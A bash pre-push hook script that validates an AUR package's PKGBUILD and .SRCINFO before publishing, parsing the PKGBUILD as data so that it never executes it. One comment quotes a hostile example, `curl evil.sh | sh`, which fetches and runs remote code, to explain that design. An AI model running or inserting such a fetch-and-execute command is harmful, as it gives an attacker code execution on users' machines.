#!/usr/bin/env bash
#
# aur-preflight.sh - refuse to publish an AUR package that cannot be built.
#
# Run it from the aeroftp-bin checkout, or point it at one:
#
#     .github/scripts/aur-preflight.sh /path/to/aeroftp-bin
#
# Install it as the pre-push hook of that checkout so it cannot be forgotten:
#
#     ln -s /path/to/aeroftp/.github/scripts/aur-preflight.sh \
#           /path/to/aeroftp-bin/.git/hooks/pre-push
#
# (`ln -s`, not `ln -sf`: refuse rather than silently replace a hook that is
# already there and may be doing something else.)
#
# Why this exists: v3.5.2 was pushed with the sha256sums array closed after its
# first element. The PKGBUILD could not be sourced at all, so makepkg died before
# it downloaded anything and nobody could install the package for about 23 hours,
# until v3.5.3 replaced it. A single `bash -n` would have caught it. The AUR runs
# no CI: whatever is pushed is what every user gets, immediately.
#
# Checks, in order:
#   1. PKGBUILD parses as bash
#   2. .SRCINFO agrees with PKGBUILD, value by value, sources and checksums
#      included (regenerated diff on Arch, expanded compare off it)
#   3. sha256sums[0] is a full 64 hex digest, not SKIP and not a placeholder
#   4. no source line carries a version other than pkgver
#   5. every release URL resolves (skip deliberately with --offline)
#
set -uo pipefail

offline=0
repo=""
for arg in "$@"; do
    case "$arg" in
        --offline) offline=1 ;;
        -h|--help) sed -n '3,29p' "$0" | sed 's/^# \?//'; exit 0 ;;
        *) repo="$arg" ;;
    esac
done

if [ -n "$repo" ]; then
    cd "$repo" || { echo "aur-preflight: cannot enter $repo" >&2; exit 2; }
elif root=$(git rev-parse --show-toplevel 2>/dev/null); then
    cd "$root" || exit 2
fi

[ -f PKGBUILD ] || { echo "aur-preflight: no PKGBUILD here ($PWD)" >&2; exit 2; }
[ -f .SRCINFO ] || { echo "aur-preflight: no .SRCINFO here ($PWD)" >&2; exit 2; }

fail=0
note() { echo "aur-preflight: $*" >&2; fail=1; }

# Name the missing tool rather than failing later with a message that sends the
# reader into the PKGBUILD. curl is handled separately, further down, because
# --offline is a legitimate way to do without it.
for _tool in awk sed mktemp; do
    command -v "$_tool" >/dev/null 2>&1 || {
        echo "aur-preflight: $_tool is required and not on PATH" >&2
        exit 2
    }
done

# mktemp can fail (full or read-only TMPDIR). Bail out rather than carry an empty
# path into the trap below.
tmp=$(mktemp -d) || { echo "aur-preflight: cannot create a temporary directory" >&2; exit 2; }
trap 'rm -rf -- "$tmp"' EXIT

# 1. The PKGBUILD must parse. This is the v3.5.2 check.
if ! bash -n PKGBUILD 2>"$tmp/syntax"; then
    note "PKGBUILD is not sourceable, makepkg would abort before downloading anything"
    sed 's/^/    /' "$tmp/syntax" >&2
    # Every check below reads fields out of the PKGBUILD, so stop here.
    echo "aur-preflight: FAILED" >&2
    exit 1
fi

# ${pkgver} inside a source URL has to be compared expanded, not as source text,
# so the values cannot simply be read with sed. The obvious way to expand them is
# to source the PKGBUILD, which is what makepkg does at build time, but a
# preflight script reads as "only checks" and must not run someone's package.
#
# An earlier version of this script sliced out the top level assignments and
# sourced only those, in a subshell with an empty environment, believing that
# left the commands behind. It does not: an assignment is executable syntax, so
# `pkgver=$(curl evil.sh | sh)` is a top level assignment and runs when sourced.
# `env -i` clears variables, it is not a sandbox. So the PKGBUILD is now read as
# DATA: awk extracts literal assignments only, refuses anything that could
# execute, and expands ${pkgname}/${pkgver} itself. Nothing from the file is ever
# passed to a shell.
if ! awk '
    function die(msg) { print "ERR " msg > "/dev/stderr"; dying = 1; exit 1 }
    # What counts as a literal depends on the quoting, exactly as the shell reads
    # it. Single quotes make the content inert, so anything inside is data. Double
    # quotes still expand $ and backticks, but leave (, ), ;, | and friends as
    # ordinary characters, so refusing those would reject a legitimate pkgdesc.
    # A bare token has nothing protecting it, so only inert characters are allowed.
    # Whatever survives is expanded (pkgname/pkgver only) and must then carry no $
    # at all: an expansion we do not resolve is one we cannot vouch for.
    function literal(v,    inner) {
        if (v ~ /^'"'"'[^'"'"']*'"'"'$/) return substr(v, 2, length(v) - 2)
        if (v ~ /^"[^"]*"$/) inner = substr(v, 2, length(v) - 2)
        else if (v ~ /^[A-Za-z0-9._:+@,\/~=%?&#${}-]+$/) inner = v
        else return "\001"
        if (inner ~ /[`\\]/) return "\001"
        inner = expand(inner)
        if (index(inner, "$") > 0) return "\001"
        return inner
    }
    # Only ${pkgname} / ${pkgver} (and the unbraced forms) are resolved, because
    # they are the only expansions an AUR source line legitimately needs here.
    function expand(v) {
        gsub(/\$\{pkgname\}/, pkgname, v); gsub(/\$pkgname/, pkgname, v)
        gsub(/\$\{pkgver\}/,  pkgver,  v); gsub(/\$pkgver/,  pkgver,  v)
        return v
    }
    # Emit every literal on one array line. PKGBUILDs write arrays both one entry
    # per line and several entries on one line; both are ordinary, so the parser
    # tokenises rather than treating a second entry as shell syntax.
    function emit_items(name, text,    rest, tok, val, n) {
        rest = text
        n = 0
        while (1) {
            sub(/^[[:space:]]+/, "", rest)
            if (rest == "") return n
            if (rest ~ /^"/)        { if (match(rest, /^"[^"]*"/) == 0) die("unterminated quote in " name) }
            else if (rest ~ /^'"'"'/) { if (match(rest, /^'"'"'[^'"'"']*'"'"'/) == 0) die("unterminated quote in " name) }
            else                    { match(rest, /^[^[:space:]]+/) }
            tok = substr(rest, RSTART, RLENGTH)
            rest = substr(rest, RSTART + RLENGTH)
            val = literal(tok)
            if (val == "\001") die("array " name " carries shell syntax: " tok)
            print (name == "source" ? "SOURCE " val : "SHA256 " val)
            n++
        }
    }
    # Inside an array, until the closing parenthesis.
    arr != "" {
        line = $0
        sub(/[[:space:]]*#.*$/, "", line)
        sub(/^[[:space:]]+/, "", line); sub(/[[:space:]]+$/, "", line)
        if (line == "") next
        closes = 0
        if (line ~ /\)$/) { closes = 1; sub(/[[:space:]]*\)$/, "", line) }
        if (line != "") emit_items(arr, line)
        if (closes) arr = ""
        next
    }
    # A top level assignment. Anything indented belongs to a function body.
    /^[A-Za-z_][A-Za-z0-9_]*=/ {
        eq = index($0, "="); name = substr($0, 1, eq - 1); rest = substr($0, eq + 1)
        if (name != "pkgname" && name != "pkgver" && name != "pkgrel" && \
            name != "pkgdesc" && name != "source" && name != "sha256sums") next
        if (rest ~ /^\(/) {
            if (name != "source" && name != "sha256sums") die(name " must be a scalar")
            sub(/^\(/, "", rest)
            arr = name
            sub(/^[[:space:]]+/, "", rest); sub(/[[:space:]]+$/, "", rest)
            if (rest == ")") { arr = ""; next }
            if (rest != "") {
                closes = 0
                if (rest ~ /\)$/) { closes = 1; sub(/[[:space:]]*\)$/, "", rest) }
                if (rest != "") emit_items(name, rest)
                if (closes) arr = ""
            }
            next
        }
        if (name == "source" || name == "sha256sums") die(name " must be an array")
        val = literal(rest)
        if (val == "\001") die(name " is not a literal assignment: " rest)
        if (name == "pkgname") pkgname = val
        if (name == "pkgver")  pkgver  = val
        print "SCALAR " name " " val
        next
    }
    # `exit` runs END too, so a second complaint would follow the real one.
    END { if (!dying && arr != "") die("unterminated array " arr) }
' PKGBUILD > "$tmp/fields" 2>"$tmp/parse.err"; then
    note "PKGBUILD is not a plain literal package definition, so it cannot be checked without running it"
    sed 's/^ERR /    /' "$tmp/parse.err" >&2
    echo "aur-preflight: FAILED" >&2
    exit 1
fi

# Read the extracted fields as data. No `source`, no `eval`: the values reach the
# shell through `read`, so nothing in the PKGBUILD can execute even now.
pkgname=""; pkgver=""; pkgrel=""; pkgdesc=""
source=(); sha256sums=()
while IFS= read -r _line; do
    case "$_line" in
        "SCALAR pkgname "*)  pkgname="${_line#SCALAR pkgname }" ;;
        "SCALAR pkgver "*)   pkgver="${_line#SCALAR pkgver }" ;;
        "SCALAR pkgrel "*)   pkgrel="${_line#SCALAR pkgrel }" ;;
        "SCALAR pkgdesc "*)  pkgdesc="${_line#SCALAR pkgdesc }" ;;
        "SOURCE "*)          source+=("${_line#SOURCE }") ;;
        "SHA256 "*)          sha256sums+=("${_line#SHA256 }") ;;
    esac
done < "$tmp/fields"

if [ -z "$pkgname" ] || [ -z "$pkgver" ] || [ "${#source[@]}" -eq 0 ] || [ "${#sha256sums[@]}" -eq 0 ]; then
    note "PKGBUILD declares none of pkgname/pkgver/source/sha256sums as literals"
    echo "aur-preflight: FAILED" >&2
    exit 1
fi

srcfield() { sed -n "s/^[[:space:]]*$1 = //p" .SRCINFO | head -1; }
mapfile -t srcinfo_sources < <(sed -n 's/^[[:space:]]*source = //p' .SRCINFO)
mapfile -t srcinfo_sums    < <(sed -n 's/^[[:space:]]*sha256sums = //p' .SRCINFO)

# 2. .SRCINFO is what the AUR and every helper read. A PKGBUILD fix that never
#    reached it ships the old package to users while looking fixed locally.
# `makepkg --printsrcinfo` would regenerate .SRCINFO for an exact diff, and it is
# deliberately NOT used: makepkg sources the PKGBUILD, which is the one thing this
# script must not do. The value comparison below is what runs everywhere, on Arch
# and off it, and it catches the same drift: every scalar, every source entry and
# every checksum is compared one by one, so a digest bumped in the PKGBUILD alone
# cannot hide behind equal entry counts.
for k in pkgname pkgver pkgrel pkgdesc; do
    p="${!k-}"; s=$(srcfield "$k")
    [ "$p" = "$s" ] || note "$k differs: PKGBUILD='$p' .SRCINFO='$s'"
done
if [ "${#source[@]}" -ne "${#srcinfo_sources[@]}" ]; then
    note "PKGBUILD has ${#source[@]} sources, .SRCINFO has ${#srcinfo_sources[@]}"
else
    for i in "${!source[@]}"; do
        [ "${source[$i]}" = "${srcinfo_sources[$i]}" ] || \
            note "source[$i] differs:
    PKGBUILD: ${source[$i]}
    .SRCINFO: ${srcinfo_sources[$i]}"
    done
fi
if [ "${#sha256sums[@]}" -ne "${#srcinfo_sums[@]}" ]; then
    note "PKGBUILD has ${#sha256sums[@]} sha256sums, .SRCINFO has ${#srcinfo_sums[@]}"
else
    for i in "${!sha256sums[@]}"; do
        [ "${sha256sums[$i]}" = "${srcinfo_sums[$i]}" ] || \
            note "sha256sums[$i] differs: PKGBUILD='${sha256sums[$i]}' .SRCINFO='${srcinfo_sums[$i]}'"
    done
fi

[ "${#source[@]}" -eq "${#sha256sums[@]}" ] || \
    note "PKGBUILD has ${#source[@]} sources but ${#sha256sums[@]} sha256sums"

# 3. A real digest on the payload. SKIP belongs to the Sigstore bundle only, which
#    prepare() authenticates with cosign; SKIP on the .deb would pin nothing.
#    Match the whole value: a 64 char string with one stray character is not a
#    digest, and makepkg would reject it after the user has downloaded 75 MB.
first_sum="${sha256sums[0]-}"
if [[ ! "$first_sum" =~ ^[0-9a-f]{64}$ ]]; then
    note "sha256sums[0] is '${first_sum}', expected 64 lowercase hex characters (the .deb digest)"
fi

# 4. Both source lines are expanded in .SRCINFO, so a hand edit can update one and
#    miss the other, and a URL that hardcodes a version ignores the bump entirely.
# Compare the URL alone: a "aeroftp-bin-${pkgver}.deb::" rename prefix always
# carries the version, so checking the whole entry would pass while the download
# URL behind it still points at the previous release.
for s in "${source[@]}" "${srcinfo_sources[@]}"; do
    case "${s#*::}" in
        *"$pkgver"*) ;;
        *) note "source URL does not carry pkgver ${pkgver}: ${s}" ;;
    esac
done

# 5. A source that 404s fails the build for every user, and the release assets are
#    named by the workflow, so a rename or a missing upload only shows up here.
# Filtered in bash rather than through sed/grep: this runs as a git hook, where a
# missing tool must not silently produce an empty list and a green summary line.
urls=()
for s in "${source[@]}"; do
    u="${s#*::}"   # drop the "renamed-file::" prefix when there is one
    case "$u" in https://*|http://*) urls+=("$u") ;; esac
done

if [ "$offline" -eq 1 ]; then
    echo "aur-preflight: --offline, not checking that the ${#urls[@]} sources resolve" >&2
elif [ "${#urls[@]}" -eq 0 ]; then
    note "no http(s) source to check, which is not what this package looks like"
elif ! command -v curl >/dev/null 2>&1; then
    # Fail closed: silently skipping would print a green line that means nothing.
    note "curl is not available, cannot check that the sources resolve (pass --offline to accept that)"
else
    for url in "${urls[@]}"; do
        code=$(curl -sIL --retry 2 --max-time 25 -o /dev/null -w '%{http_code}' "$url" 2>/dev/null)
        [ "$code" = "200" ] || note "source does not resolve (HTTP ${code:-none}): $url"
    done
fi

if [ "$fail" -ne 0 ]; then
    echo "aur-preflight: FAILED, refusing to publish a broken package" >&2
    exit 1
fi
if [ "$offline" -eq 1 ]; then
    echo "aur-preflight: PKGBUILD parses as literals, .SRCINFO in sync, sources NOT checked (--offline)"
else
    echo "aur-preflight: PKGBUILD sourceable, .SRCINFO in sync, ${#urls[@]} sources resolve"
fi
